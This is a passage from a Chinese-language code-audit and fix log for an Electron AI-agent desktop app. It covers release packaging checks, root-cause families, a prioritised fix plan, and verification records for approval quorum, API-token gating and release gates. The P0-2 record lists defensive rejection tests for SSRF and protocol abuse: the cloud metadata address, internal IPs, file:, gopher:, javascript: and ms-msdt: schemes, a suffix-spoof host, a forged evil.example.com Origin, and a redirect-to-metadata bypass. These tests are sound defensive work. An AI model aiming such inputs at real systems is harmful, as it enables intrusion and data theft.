- 原生模块不会成为发布阻塞点：`asarUnpack` 覆盖 `**/*.node` 与整个 better-sqlite3；v13 依赖 `node-addon-api`（N-API，ABI 跨 Node/Electron 稳定），`lib/binding.js` 优先取 `prebuilds/win32-x64.node`（win-unpacked 内确认存在）→ 打包后 require 不失败；`build/Release` 无 `.node` 不致害；`@electron/rebuild` 零调用方但也不需要。
- 依赖纯净：electron-builder 只打生产依赖，asar 头实测 node_modules 仅 better-sqlite3/chokidar/node-addon-api/readdirp/uuid/ws/zod，devDeps 未泄入。
- 敏感物当前**未**进包（与 REV-278 的潜伏态区分）：`.env`、`Data/`、`Logs/`、`coverage/`、`release/` 均不在 `files` 白名单；`Configs/*.json` 全为 `api_key_ref: "env:…"` 引用，无真实 key；`!**/*.map` 挡住了 2.4MB 后端 sourcemap 与 vite map（Electron 形态）；`signing.env.json` 等已在 `.gitignore:28-33` 覆盖。
- 端口与代理矩阵自洽：vite proxy `5173→3000` = `Src/main.ts:848` httpPort = `Configs/default.json:12-14` corsOrigins；`api.ts:52-66` 经 preload `getServerPorts()` 动态拼 `http://127.0.0.1:<port>`，**无硬编码 localhost:3000**；`serverApi.ts:74` 的 127.0.0.1:8787 是独立 `Server/`（`Server/src/config.ts:164`），非误配。
- `base:'./'` 生效：`dist/renderer/index.html:9-16` 全部 `./assets/...` 相对路径，file:// 下 ESM + `crossorigin` 实测可用（probe 的 DOM 断言已过）→ 非问题。
- `verifyClientDist` 失败**会中断**（`process.exit(1)` + `&&` 链向上传播），不是打印后 exit 0（其强度不足见 REV-294）。
- 前端 bundle 纯净：无 `node:fs`/`__dirname`/`Buffer`/`process.env`（`coffee-*`/`ruby-*` 命中是 shiki 关键字表，误报）；无 `VITE_*` 密钥注入；`manualChunks` 的 9 个目标文件全部存在。
- 已规避的两个历史坑：`Client/dist` 化石靠 mtime 择新（`main.ts:860-865`，风险另见 REV-292）；EADDRINUSE 已从 listen error 显式 reject（`httpServer.ts:97-100`）并在 Electron 侧转成含「改端口」指引的错误框（`electron/main.ts:368`）。
- `install.ps1`/`install.sh` 不下载远程脚本，`install.sh:29` 有 `set -e` 不吞错。

---

## 16. 全库审查收口与修复优先级（12 个切片全部完成后）

> 本章**仍不含任何代码改动**，只把 §1~§15 的条目收敛成可执行的立项顺序。修复动作在获得确认后才开工。

### 16.1 收口状态

| 项 | 数值 |
|---|---|
| 覆盖切片 | M01~M12（12/12），三端（`Client/src` / `Src/` 五层 / `electron/`+`Src/Interface/IpcBridge`）逐模块交叉。**原口径未含独立部署线 `Server/`**——它持有密码哈希、令牌家族、验证码与跨端同步，2026-10-09 分两片补审：**M13** 应用代码（§18）、**M14** 测试/迁移/运维面与 CI 接线（§19）。本表以下各行数值仍按 M01~M12 计 |
| 登记编号 | REV-001 ~ REV-348，无断号；`REV-202` 在 §12.3 与 §12.5 重复使用一次（**以 §12.5 前端条目为准**，§12.3 该行的结论已被其取代）。其中 REV-325/326/327 是**修复期真实取证时新发现**的，REV-328/329/330/331 是 P0-4（设置真实生效）取证时新发现的，REV-332/333/334 是 P0-4 收口时把"工作方式"接到编排器上、在真实后端跑通任务链路时新发现的，REV-335 是 P0-4 接线时被**全量单测拦下的自伤回归**（事件缓冲语义被改），REV-336 是同一批真实运行留下的 `agents` 幽灵行，REV-337 是收口收尾的三轮真实 Agent 回归里暴露的**日志信号噪声**（库未初始化却按 error 逐条打），REV-338/339/340/341/342 是 P1-7（配置写路径配对 ＋ 任务与 Agent 终态权威）按 §16.4 做真实环境取证时发现的任务链缺口，REV-343~348 是 P1-8（把派发执行真正接上）按同一口径做真实进程取证时发现的六条：REV-344/345 来自第一轮实跑（`subtasks` 只在成功侧写、任务书预算从未到达 Loop），REV-346/347/348 来自第二轮实跑（任务书时限同样只是记录、`started_at` 恒 NULL、迭代内的阻塞审批把整条后台队列挂住 605s），REV-343 是为"本地全绿 ≠ CI 绿"补的 import 大小写静态探针；第三轮实跑用于复验 REV-344/345①/346/347 的修复效果，均见 §17 与 §16.12 |
| 独立条目 | 347 条（评审轮 323 + 修复轮 24） |
| 证据强度 | `✅复核`（主审亲自读码/跑只读命令确认）93 处；`△子代理`（仅子代理给 file:line，**修复前需抽样验证**）235 处 |
| 严重度分布（粗口径） | Critical/致命 8 条 · 高 ~109 条 · 其余为中/中低/低 |
| M13/M14 补片（2026-10-09，`Server/`） | 新增 REV-349~383（**35 条**：严重 3 · 高 8 · 中高 8 · 中 11 · 低-中 1 · 低 4，§18）与 REV-384~412（**29 条**：严重 1 · 高 5 · 中高 5 · 中 13 · 低-中 5，§19），合计 64 条。取证强度：`✅复核` 覆盖两章全部 严重/高/中高 条目，其中 5 条为 `✅实证`（REV-349/352 用 `fastify@5.12.5` 只读 inject 复现；REV-384 逐文件确认 `describe.skip` 守卫、REV-394 的"零并发用例"用 `grep Promise.all\|Promise.race Server/test` 证否、REV-405 用 `git check-ignore` 证明产物未忽略）；其余 `△子代理` 条目已标注需抽样。§18.3 与 §19.3 共记录约 35 项「已核对为干净」；§18.4 提出 P0-5 / P1-9 / P2-5，§19.4 追加 **P0-6 云端验证面接通**（须早于一切云端修复）与 **P1-10 云端数据演进加固**，均待并入 §16.3 |
| M15 补片（2026-10-10，`Prompts/`·`Skills/`·`Benchmarks/` 及三端接线） | 新增 REV-413~427（**15 条**：高 4 · 中高 1 · 中 8 · 低-中 2，§20）。取证强度：15 条**全部 `✅复核`**（主审逐文件读码，无一条仅凭子代理 file:line），其中 2 条为 `✅实证`（REV-422 用 `npx tsc` 复现 `Scripts/rubricRecalibrate.ts:113` 的 TS1109；REV-427 用 `find Tests -name '*.spec.ts'`=150 / `it(\|test(`=1695 与基线 `testCount:582 / testFilesCount:24` 对账）。三处子代理结论经复核判为不成立或已重复而未立项：`getL3Calibration()` 并非符号缺失（定义在 `skillsAssets.ts:169`，只是零调用）；执行侧的 `behaviorCode` 缺陷已由 **REV-080/084** 覆盖、技能清单读失败洗成空已由 **REV-113** 覆盖、`~/.ssh` 路径漂移已由 **REV-039** 覆盖、`Prompts/Skills` 打包双份已由 **REV-284/298** 覆盖，本片一律交叉引用而非重复登记。§20 末记录 9 项「已核对为干净」；§20.2 提出新增 **P1-11 资产-代码接线对账**（9 条同根，可由"配置键必须有 `Src` 读取点"的单条门禁统一拦住），并把 REV-420 并入 P1-9、REV-413 并入 P0-4，均待并入 §16.3 |
| M16 补片（2026-10-10，根 `Tests/**` 与 vitest / CI 门禁接线） | 新增 REV-428~450（**23 条**：严重 2 · 高 7 · 中高 5 · 中 7 · 低-中 2，§21）。取证强度：19 条 `✅复核` + 4 条 `✅实证`（REV-428 无密钥跳过 13 处 / REV-431 `Src` 导出 88 个 `reset*`·`clear*` 且生产零调用 / REV-449 用例标题与分节注释矛盾 / REV-430 的 142 处前置 `return`；计数均由主审只读复现）。**REV-429 未实跑**（该 spec 会删除本机真实 `Data/.secrets/providers.json.enc`），改由路径同源性静态成立并列入 §21.3 待真实环境取证。5 条子代理候选判为重复而未立项，改交叉引用：CI 读不到 `coverage-summary.json` = **REV-301**、Tests 被三处 tsconfig 排除 = **REV-308**、build job 与 lint job 重复 = **REV-300/303**、`isNetworkAllowed` 零调用的代码侧 = **REV-063**、前端 `decidedBy` 同值 = **REV-040**；本片只登记其**测试面后果**。另建议新增成因族 **F6「测试自证」**（23 条中 17 条同结构：oracle 由测试自己提供），并提出 **P0-7 测试面假绿止血**（REV-428~431，排在 P0-6 之后、所有 P1 之前）。§21 末记录 10 项「已核对为干净」 |
| 另有独立登记 | `Docs/Dev/Agent循环与路径-Bug登记.md`（BUG-2026-10-08-1~3），本文件未重复立项 |

### 16.2 这不是 323 个孤立 Bug：五条系统性成因

修复前先按家族归并，可把条目数压到约 20 个工单。

| 成因 | 一句话机制 | 主要成员 |
|---|---|---|
| **F1 身份可自报 + 零鉴权中间件 + 进程全局 owner** | 请求体/`decidedBy` 字符串里的身份被当作可信身份，`setActiveOwner()` 是进程级可变全局，接入层没有统一鉴权 | REV-001、REV-132~147（接入面）、REV-148~161（桥面）、REV-174~190 中的属主过滤、REV-264（法定人数）、REV-280（`0.0.0.0` 默认绑）、REV-286/287（IPC 越权与协议放行）、REV-317（审批载荷分叉） |
| **F2 fail-soft：把失败洗成"空成功"** | `catch` 后 `return {ok:true,data:[]}` / 返回 `!res.ok` 不判 / 门禁只 warn / 注释「跳过」满足吞错检测 | REV-004、REV-012/013、REV-214、REV-224、REV-235、REV-257、REV-265/266、REV-272、REV-281/282/283/294/296/302（门禁侧同源）、REV-305、REV-320 |
| **F3 可观测性链在四个点上断裂** | 无崩溃兜底 → 无 trace 透传 → 退出不 flush → 无脱敏护栏；主/渲染进程零落盘 | REV-215/216/217/218/219/220/221/222/223/227/228/229/230/231/233/234/236/237/238/239、REV-304/305/310 |
| **F4 指标与告警口径被伪造** | 无数据时用固定比例/硬编码常量补齐，UI 呈现为真实读数 | REV-085~100（治理大屏）、REV-267（枚举错配）、REV-268（伪造案件）、REV-269（`INITIAL_SUPPLY` 差 100 倍）、REV-270（桑基比例）、REV-275（假 G0/G1）、REV-271（不存在的过滤前缀）、REV-234（假证据型诊断） |
| **F5 已实现但未接线（孤岛）** | 代码、事件、控件都存在，缺的只是"接上"这一步，于是既占体积又给读者"已具备"的错觉 | REV-251/252/253/316（registry·Subscribe·FamilyErrorBoundary）、REV-217（`runInTrace`）、REV-226（本地无 health 路由）、REV-273（8 个无入口视图）、REV-323（死 IPC 频道）、REV-010/319（workingMode 传而不消）、REV-260、REV-321（死分支事件）、REV-307/311（死配置与 no-op 门禁） |

### 16.3 修复批次建议（P0 → P2，含依赖顺序与验收口径）

**P0 批次**：业务不可用或凭据/源码可外泄，先于一切。

| 工单 | 合并条目 | 必须先做的理由 | 验收口径（真实环境，非单测） |
|---|---|---|---|
| P0-1 审批链路贯通 | REV-264 + 317 + 313 + 321 + 314 | CRITICAL 审批在当前代码下**永远不通过**（前后端口径不同），叠加每 token 一次 `/api/agents` 触发 429 → 用户"点了批准没反应"；这是唯一一条"安全机制同时不可用且不可审计"的路径 | 两个不同 `owner` 身份各自批准 → 状态转 `APPROVED`；同一身份重复提交不增加计数；重启会话后内嵌审批卡仍在（按 `toolCallId` 重链）；生成期 `/api/agents` 请求数 ≤ 节流上限 **✅已收口(2026-10-08)：见 §16.7** |
| P0-2 接入层身份与默认绑定 | REV-001 + 132~147 中的鉴权缺失 + 280 + 286/287 | 默认 `0.0.0.0` + 无鉴权 + 身份自报 = 同网段可读写他人会话、可代答审批、可打 `open-path` | 打包/桌面态默认仅 `127.0.0.1`；未携带有效 Bearer 的 `/api/*` 一律 401 且留痕（**口径偏移**：控制面凭据另用 `X-Civitas-Api-Token`，`Bearer` 同时仍接受——`Authorization` 归治理身份验真，理由见 §16.8-1）；`server-fetch` 拒绝非 `127.0.0.1:<port>`；`setWindowOpenHandler` 与 `open-external` 共用同一 scheme 白名单 **✅已收口(2026-10-08)：见 §16.8** |
| P0-3 发布门禁与泄漏面 | REV-278/279/281/282/283/291/294/296/302 | 「假绿灯」由四条独立成因叠成，任修其一都不成立；同时源码 `.map` 与 `Configs/local.json` 是两条实际泄漏面；当前 NSIS 包装完即无主程序 | 构造一个含假 `local.json` 与 `.map` 的产物 → 门禁必须 fail；不带证书时 `package` 必须 fail；`release/*.exe` 体积与内容（入口、asar 头、binding）被真实校验；`.map` 在浏览器态请求返回 404 **✅已收口(2026-10-09)：四条验收口径逐项实测，见 §16.9；残留——一次含第 2 步静态门禁与第 8 步探针的完整 `npm run package` 需人工执行** |
| P0-4 设置真实生效 | REV-265/266 + 319 + 010 | 153 个控件与 `workingMode` 全部"传而不消"，用户所有配置对运行时无影响却以为生效——这是体验层最广泛的假象 | 改一项阈值 → 重启后仍生效且后端读到新值；`resetField` 后 UI 与后端一致；未接线的控件（附件、赞踩、AgentMonitor 筛选）要么实装要么移除 **✅已收口(2026-10-09)：三相位真实重启循环 + 真实后端任务链路取证，见 §16.10；残留——REV-333 成功侧终态、REV-334（派发即标完成）、REV-336（agents 幽灵行）、REV-331/330（配置写路径配对）归 P1-7、Settings 点按冒烟需人工** |

**P1 批次**：修完 P0 后才能被验证（否则观测不到）。

| 工单 | 合并条目 | 依赖 |
|---|---|---|
| P1-1 单一 shutdown 入口 + 崩溃兜底 | REV-304/305/310 + 216/227/236 | 两形态（独立 SIGINT / Electron `before-quit`）共用同一序列；补 `SIGTERM`+两级 handler；验收须跑真实信号（见 §16.4） |
| P1-2 traceId 贯通 | REV-217/218/228/230/231/239 + 313 | P1-1 之后；入口包 `runInTrace`、IPC 携带 traceId、事件持久化前缀补齐 |
| P1-3 错误呈现统一 | REV-257/272/320 + 235 + 011 家族 | 单一 Result 错误形；每处 `catch` 必须可被 `noSilentErrorSwallow` 门禁"实质"满足（不接受仅注释） |
| P1-4 事件 SSOT 与契约对账 | REV-315/316/324 + 318 + 清单 A/B | 生成产物纳入 CI 比对；先决定「事件优先 vs REST 优先」的单一口径，再决定零消费事件是删还是接 |
| P1-5 限流与退避 | REV-314/322/256 + 219 | 429 需留痕、`Retry-After` 需可读；P0-1 的部分症状实际来自这里 |
| P1-6 数据根与迁移可见性 | REV-233 + 191~202 的迁移事务项 + 306 | `%TEMP%` 回落必须告知用户；`engines` 提到 ≥22.12 并同步 CI |
| P1-7 配置写路径配对校验 + 任务/Agent 终态权威（**修复期新增，原六批无对应桶**） | REV-330 + 331 + 333（成功侧残留）+ 334 + 336 | 六批在评审期拟定，未预期"P0-4 接线后新暴露的写路径配对缺陷与终态口径缺陷"，故另立一批；依赖 P0-4（设置真实生效）与 P0-1（审批贯通）都已合批才可观测。验收口径（真实环境）：① `allowRemoteAccess=true` 而无可用 `server.apiToken` 时写入必须回 `invalid` 并在界面给出补救路径，不得出现"正常重启后全 401"；② 对对象段写标量必须被拒（`supervision.rateLimit=1` 回 `invalid`，磁盘段不被整体替换）；③ 提交一条 DELEGATION 任务，任务卡在编排真正结束（`TASK_COMPLETED`/`finalizeOrchestration`）前不得显示"已完成"，且 `tasks` 行终态与内存记录一致；④ DIRECT 成功任务的 `tasks` 行必须落终态而非永远 `running`；⑤ 编排结束后 `agents` 行不得留下 `status=running` 且 `destroyed_at IS NULL` 的幽灵行，Agent 监控列表可辨"属于哪个任务" **✅已收口(2026-10-09)：① ② ③ 在 `:3000` 真实进程含真实重启取证，④ ⑤ 代码与真实库路径取证、真实进程因链路缺口（REV-338/339/341）不可达并如实登记，详见 §16.11** |
| P1-8 派发执行驱动 + 终态链路贯通（**§16.11 收口时新增，即 ④⑤"真实进程不可达"的清欠批**） | REV-338 + 339 + 340 + 341 + 344 + 345（仅 ①"载荷丢字段"）+ 346 + 347 | 依赖 P1-7（终态权威与读侧映射必须先立口径）与 P0-1（审批链路）。验收口径（真实环境，非单测；取证脚本**只提交一次任务、之后只轮询**，绝不手工 `/execute`——"驱动执行"必须由产品自己完成）：① 一次 `POST /api/tasks`（DELEGATION）后 Worker 由产品自身驱动跑完；② `tasks` 行终态由编排收尾自己写入（失败侧带 `_summary`）；③ `subtasks` 行终态与 `tasks` 行口径一致并带 `failure_reason`/`completed_at`，`started_at` 不再恒 `NULL`、耗时可算；④ 编排结束后 `agents` 行全销毁（`status=destroyed` + `destroyed_at`），`running AND destroyed_at IS NULL` 幽灵行为 0，且不再新增 `trace-exec-*` 孤儿行；⑤ 任务书的 `token_budget` 与 `timeout_ms` 真的进入 Loop（`budget_exhausted` 会触发、实耗可与台账时限对照）**✅已收口(2026-10-09)：① ② ③ ④ ⑤ 在 `:3000` 真实进程三轮实跑取证（前两轮各发现新缺口，第三轮为修复后复验），详见 §16.12；残留——REV-345 的 ②③（单轮 20.8 万 token 的用量口径 + 预算优先级）归 P1-5、REV-348（迭代内阻塞审批不受时限约束，且挂住整条后台队列）待产品口径、REV-343 需 Linux 实跑、REV-342 归 P2-2** |

**P2 批次**：清理与加固，不与 P0/P1 混批提交。

| 工单 | 合并条目 |
|---|---|
| P2-1 孤岛二选一（实装 or 删除） | REV-251/252/253/316、REV-273、REV-323、REV-307/311 |
| P2-2 伪造可视化改真实/空态 | REV-267/268/269/270/271/275 + 085~100 |
| P2-3 文案与 a11y | REV-276/277/263/260/261 |
| P2-4 构建链与依赖 | REV-290/293/295/297/298/299/300/301/303/308/309 + 284 |

### 16.4 静态审查无法取证、必须人工或真实环境验证的项

| 待验证项 | 关联条目 | 需要的动作 |
|---|---|---|
| Electron GUI 冒烟 | REV-283、P0-3 | Windows 桌面下安装/启动/发消息（沙箱内无法起 GUI） |
| 真实信号关闭 | REV-304/305、P1-1 | 手工 `SIGTERM`/关闭窗口，检查 WAL checkpoint 与 `Logs/_Meta` |
| 干净工作区复现 | REV-290/303 | 新克隆 + 只跑 `npm ci` 后执行 `npm run build:client` |
| CI 恒红 | REV-301 | 触发一次 workflow，确认 test job 报错原因 |
| Node 版本回落 | REV-306 | Node 20.0~20.10 下观察 `findAppRoot` 是否落 `cwd` |
| 真实模型连接 | M04 疑点（§6「疑点」未立条部分） | 实连供应商 Key 验证路由与降级 |
| 三轮真实 Agent 调用回归 | 架构变更后必做（用户既定要求） | P0 全部合批后执行 |
| `△子代理` 条目抽样 | 全部 235 处 | 每个工单开工前抽 2~3 条读码确认，避免按错误前提修复 |

### 16.5 本轮明确不登记的边界

- **文档与代码漂移**：另册（`Docs/Dev/*-差别清单.md`），本文件只看代码自身缺陷。
- **既有登记的同一现象**：`Agent循环与路径-Bug登记.md` BUG-2026-10-08-1~3 未重复立项。
- **已核对为干净的点**：各节末「已核对为干净的点」清单（§3、M02~M12 各小节）＝本轮已排除项，后续勿重复排查；其中若干实现可直接作为修复模板（如 `ApprovalQueue.tsx:53-55` 的错误呈现、`ModelProviderPanel` 的真实 IPC 接线、`useApprovalPolling.ts` 的引用计数）。
- **推测性疑点**：M04 需实连才能定性的部分只写入「疑点」小节，未计为缺陷条目。

### 16.6 一句话执行建议

先做 **P0-1**（单条工单解 5 个条目，且能立刻被用户感知），随后 **P0-2 与 P0-3 并行**（一个动服务端接入、一个动 `package.json`/`Scripts`，文件不冲突），P0-4 与 P1 依次跟进；**每批合批前用 §16.4 的方式做真实验证，不要以单测通过作为收口**。

### 16.7 P0-1 收口记录（2026-10-08）

**验证方式**：临时脚本 `p01-verify.ts`（已删除）用 `tsx` 起**真实后端**（`Src/main.ts` self-boot，HTTP:3000 + SQLite + 事件总线 + 审批落库），按客户端同样的调用序打真实 HTTP，而非 mock。

| 验收项 | 实测结果 |
|---|---|
| CRITICAL 双人控制可达成 | 账号 A 投 `user` → `200 {status:'PENDING', quorumBlocked:{required:2,matched:1,remainingIdentities:1}}`；切账号 B 投 `prime_director` → `200 {status:'APPROVED', decidedBy:['user:local','prime_director:account-b']}` |
| 同身份不增计数 | 同账号换角色再投 → `409 裁决未计入：身份 prime_director:local 已在本审批中行使过投票权…` |
| 已决条目属主隔离 | 账号 B 读 A 的已决详情 → `404 Approval not found` |
| 超时默认拒绝可感知 | 有等待者：`waitForApprovalDecision` 1s 后 `TIMEOUT`；**无等待者**：5s 巡检把僵尸审批落定并广播 → 订阅端收到 2 条 `loop:approval_timeout_rejected`（含 `approvalId/toolCallId`） |
| 重启重链 | `pending_approvals` 行含 `toolCallId`（tc-p01-1/2/3 全部落库）；`ai_events` 内 `loop:approval_requested`/`_decided` 可按会话取回（total=4）；内嵌卡的重链实际路径是**富消息回灌**——`messages/rich` 整体 JSON 落库 `toolCalls`，其中已含 `approvalId`，配合审批列表按 id 匹配即复原（事件回放只喂 `eventStore`，当前无消费者） |
| 评审轨迹可读 | `GET /api/reviews` → `200 {ok:true,data:[]}`（只读；无写入端点） |

**真实验证推翻了三处静态修复方案**（记录口径修正，避免后人按旧描述回退）：

1. **裁决侧属主硬拒**：先按"非当前 `owner` 一律拒绝"实现，实测第二票直接被 409 挡住——双人控制在单机多账号部署下唯一的合法路径就是"另一操作者登录另一账号投第二票"，硬拒等于把 REV-264 从身份口径搬到属主口径。改为：待裁决审批按**治理工单**跨账号可见可裁（`getPendingApprovals` 不按属主过滤、`getApproval` 仅对已决条目隔离），控制点回归"身份绑定 `role:${activeOwner}` + 法定人数按不同身份匹配"。
2. **`checkTimeoutApprovals` 运行期无人调用**：静态看"定时器 + 巡检"两条超时路径都接了事件，实测无等待者的审批永远停在 PENDING 且不发事件（全仓仅 `LoopControl/index.ts` 再导出）。已在 `main.ts` ⑰.3 挂 5s 巡检并在落定时 `logger.warn`。
3. **`/api/agents` 风暴的验收**：客户端白名单只能由代码+单测取证，真实侧证据是限流不再被生成期打满；本项留 P1-5 用 429 留痕统一取证。

**回归证据**：后端 `tsc --noEmit` 干净、`Client` `tsc --noEmit` 干净、`vitest run` 全量 **146 文件 / 1741 用例通过**（含新增 `Tests/LoopControl/approvalQuorum.spec.ts` 6 例锁住上述口径；`Tests/AgentRuntime/realAgent.spec.ts` 4 轮真实模型调用，含"首次拒绝→重新提交→通过"）、`eslint Src/` 0 error（312 warning 为既有基线）。

**遗留边界（不在本工单收口）**：`governance:/audit:/regulation:` 事件仍未持久化（P1-2）；`/api/reviews` 无决策端点，审批写侧已有控制面凭据门（P0-2）但**路由级角色授权仍缺**（REV-133 残留）；`ai_events` 体积仍受无消费者事件影响（P1-4）。

### 16.8 P0-2 收口记录（2026-10-08）

**验证方式**：临时脚本 `p02-verify.ts`（已删除）用 `tsx` 起**真实后端**（`Src/main.ts` self-boot：HTTP:3000 + SQLite + 事件总线 + 审批落库），按三种运行形态各打真实 HTTP 并回读 `Logs/business.log`——① 随包默认（回环）；② 同机用局域网地址 `10.44.81.114:3000` 探测；③ 强制 `host=0.0.0.0` + `allowRemoteAccess=true` 的远程形态。脚本共 17 项断言全过，取证时间戳见 `Logs/business.log`（`15:03:10Z` 批次）。

| 验收项（§16.3 的 P0-2 口径） | 实测结果 |
|---|---|
| 打包/桌面态默认仅 `127.0.0.1` | `Configs/default.json` = `{host:"127.0.0.1", allowRemoteAccess:false, httpPort:3000}`（`apiToken` 缺省=进程内随机生成）；`GET http://10.44.81.114:3000/api/sessions` **连接不可达**，同址 `127.0.0.1:3000` 可达 |
| 未携带有效凭据的 `/api/*` 一律 401 且留痕 | 无凭据 `GET /api/sessions` → `401`；错凭据 → `401`；`PUT /api/account/active-user` 无凭据 `401`／有凭据 `200`（合法路径未被打破）；`GET /api/approvals?status=pending` 带 `Bearer` → `200`。留痕：`{"level":"warn","message":"控制面请求被拒绝（缺少有效凭据）","source":"apiToken","data":{"method":"GET","path":"/api/sessions","peer":"127.0.0.1","credentialPresent":false}}`（`credentialPresent` 区分"没带"与"带错"） |
| `server-fetch` 拒绝非 `127.0.0.1:<port>` | `Tests/Interface/desktopUrlPolicy.spec.ts` 17 例：`127.0.0.1:<后端端口>` 放行；`:8787`/`169.254.169.254`/`192.168.1.1`/`file:`/`gopher:`/空值 拒绝；端口未就绪时拒绝原因含"尚未就绪"；pin 的账号源同端口其它 host 仍拒；后缀陷阱 `account.example.com.evil.example.com` 拒 |
| `setWindowOpenHandler` 与 `open-external` 共用同一 scheme 白名单 | 两处同调 `urlPolicy.isSafeExternalUrl`（`https:`/`mailto:`）；`http:`/`file:`/`javascript:`/`ms-msdt:`/`search-ms:`/非字符串全拒，拒绝打 `[Electron][security] 拒绝打开外部链接` |
| 凭据取得通道不可被跨站滥用 | `POST /internal/api-token`（刻意不在 `/api/` 下）：回环 POST → `200` 且 `Cache-Control: no-store`、响应**不含** `Access-Control-Allow-Origin`；GET → `403`；`Origin: https://evil.example.com` → `403`；远程形态（`remoteEnabled`）→ `403`，原因文案含 `apiToken`（引导改用配置） |

**真实运行/真实读码推翻并修正了四处静态方案**（后人按口径字面回退即重新打开）：

1. **凭据不共用 `Authorization`**：口径写的是"未携带有效 Bearer 一律 401"。但 `Authorization` 已被**治理身份验真**占用（`approvalApi.extractBearerToken`，G-09 方案 B / REV-076），两种语义不同的凭据塞进同一头会互相覆盖。实现改为：控制面凭据走专用头 `X-Civitas-Api-Token`，**同时仍接受 `Bearer`**（满足口径字面 + 向后兼容），CORS `Allow-Headers` 补该头。`Tests/Interface/httpServerHeaderPassthrough.spec.ts`（FE-041 既有回归）证明头确实能到达处理器——该用例现同时携带两种凭据。
2. **`server-fetch` 不能只允许 `127.0.0.1:<port>`**：该通道同时承载**用户配置的账号服务器**（合法业务），一刀切等于把登录打死。改为"回环后端端口 **或** 渲染进程经 `set-account-server-origin` 显式钉住的账号源"（`normalizeAccountOrigin` 校验：非回环必须 https、逐字符比 origin、拒 path）；且真实读码发现跟随重定向可绕行（合法源 302 → 元数据地址），故改 `redirect:'manual'` 逐跳复检（≤5 跳）。
3. **打包态渲染进程拿不到 HTTP bootstrap**：随包渲染层是 `file://`，相对 `/internal/api-token` 无处可发。凭据链路因此改为——`startServer()` 返回 token → 主进程内存持有 → `get-api-token` IPC 下发；只有浏览器/开发态走 HTTP bootstrap。连带必须给 `Client/vite.config.ts` 加 `/internal/api-token` 代理（否则 5173 开发态取不到凭据 → 全站 401，症状与"鉴权坏了"无法区分），并把 `/api` 代理目标由 `localhost` 改 `127.0.0.1`（避免 IPv6 解析到 `::1` 而后端只绑 `127.0.0.1`）。
4. **门必须 fail-closed**：`initApiToken` 若在 `startHttpServer` **之后**调用，中间窗口的请求会全部放行。`main.ts` 里顺序固定为「先 `initApiToken` 再 listen」，且 `isApiAuthorized` 在未初始化时一律拒绝；`Tests/Interface/bindPolicyAndApiToken.spec.ts` 用「未初始化=全拒」一条把该顺序锁住。

**凭据处理边界**：随机凭据 `randomBytes(32).base64url` **只在进程内存**，不落盘、不进 `userConfigWriter.ALLOWED_PREFIXES`（UI 白名单写路径写不到密钥）；`server.apiToken` 为可选覆盖，`configValidator` 要求非空时 ≥16 字符（"过短的凭据可被枚举，等于没有门"）。

**回归证据**：后端 `tsc --noEmit` 与 `typecheck:electron` 均干净；定向三文件 `bindPolicyAndApiToken`(16) + `desktopUrlPolicy`(17) + `httpServerHeaderPassthrough` = **40 通过**，`Tests/Client/api-credential.spec.ts` **7 通过**（含"重启后凭据轮换自愈"：实发序列 `['token-1','token-1','token-2']`、bootstrap 恰好 2 次；持续 401 只重试 1 次不递归）；修复轮结束时按打包链第 2 步的同一命令复测（`vitest run --exclude **/Tests/AgentRuntime/realAgent.spec.ts`）：**149 文件 / 1783 用例全部通过**，80.18s，`eslint Src/` **0 error / 314 warning**（P0-1 轮为 312，本批未新增 error）。需真实模型密钥的 `Tests/AgentRuntime/realAgent.spec.ts` 单跑 **4/4 通过**（Round1 17.2s / Round2 29.7s / Round3 142.6s（含一次预算内重试）/ 综合 28.5s，整文件 219.9s）——此前那条唯一失败已定性为测试自身缺陷并修复，见 §17 REV-325。

**遗留边界（不在本工单收口）**：① REV-133 的「按路由声明所需角色」——门只解决"是不是本机授权调用者"，不解决"这个身份能读哪些路由/谁的会话"；② 身份可自报（REV-134 根因），真实账号服务器的鉴权/身份绑定属后续工单；③ `open-path` 目录白名单（REV-149）与 `ipc-load-secrets`（REV-153）不在 P0-2 口径内；④ 进程级异常兜底（REV-132/158/236）归 P1-1；⑤ CSP（REV-163）；⑥ WS `:3001` 面本工单未动；⑦ Electron GUI 冒烟仍需人工（§16.4）。

### 16.9 P0-3 收口记录（2026-10-09）

**验证方式**：四条验收口径各做**正向（干净产物放行）+ 反向（刻意构造的坏产物必须拦下）**两次真实运行，产物、体积、哈希、签名状态、包内文件清单全部取自闭包目录与真实子进程退出码，不以单测通过作为收口。

| 验收口径（§16.3 原文） | 实测结果 |
|---|---|
| 含假 `local.json` 与 `.map` 的产物 → 门禁必须 fail | **反向对照**：临时撤掉 `build.files` 排除项后造假 `Configs/local.json` 重打 → 假凭据**确实**同时进入 `app.asar`（1158→1159 条目）与 `resources/app/Configs` 明文目录，`verifyRelease` 两处同时报泄漏并 exit 1；恢复护栏后重建 → asar 内无 `local.json`，`verifyRelease`「包内不含凭据/私钥泄漏面」✅。`.map` 侧：production 重建后 `dist/renderer/*.map` 由 **312 → 0**，`verifyClientDist`/`verifyRelease` 各自把"含 `.map`（含大写 `.MAP`）"判为失败，实测注入两种大小写均 exit 1 |
| 不带证书时 `package` 必须 fail | 把 `.tmp/signing/signing.env.json` 移开 → `package.cjs --check` 在第 1/8 步预检即 `❌ 未配置代码签名证书（既无 CSC_LINK/WIN_CSC_LINK，也无 .tmp/signing/signing.env.json）`，**exit 1**（发生在任何构建与 electron-builder 之前）；同条件下加 `--allow-unsigned` → 显式告警"产物未签名，SmartScreen 会拦截"并 exit 0（人主动放行≠静默降级）。证书齐备时 `verifySign -Require` 实测 `CivitasAI-Setup-0.1.0.exe` / `CivitasAI.exe` / `elevate.exe` **3/3 `Valid`**（签名主体 `Ma Hongyu (Self-Signed)`，证书至 2031-10-06，带时间戳），链校验通过 |
| `release/*.exe` 体积与内容被真实校验 | 真实重打 NSIS：exit 0，耗时 3 分 31 秒，安装包 **233,042 B → 110,252,504 B（105.1 MB）**，SHA256 `55b1f2a780ac296dad911a4848940a4cf425a6919b0ae826acf2d7e4a7c70d0b`；`verifyRelease` 八项全过（主程序 234.7 MB ≥50 MB、asar 15.5 MB、asar 内四入口、包内 `index.html` 引用的 8 个资源逐个存在、无 `.map`、无泄漏面、`app.asar.unpacked` 含 8 个 `.node` 且含 better-sqlite3、不产出 `app-update.yml`）。旧 233KB 壳此前已由同一门禁判失败。**新增** `latest.yml` 一致性核验：遗留文件写着坏包的 sha512 而同名 exe 已被新包覆盖 → 实测 `记录值 kpP1tYZa… ≠ 实际值 hLzndWLh…`，exit 1；移除该遗留元数据（本项目 `publish:null`，不再自动生成）后 exit 0 |
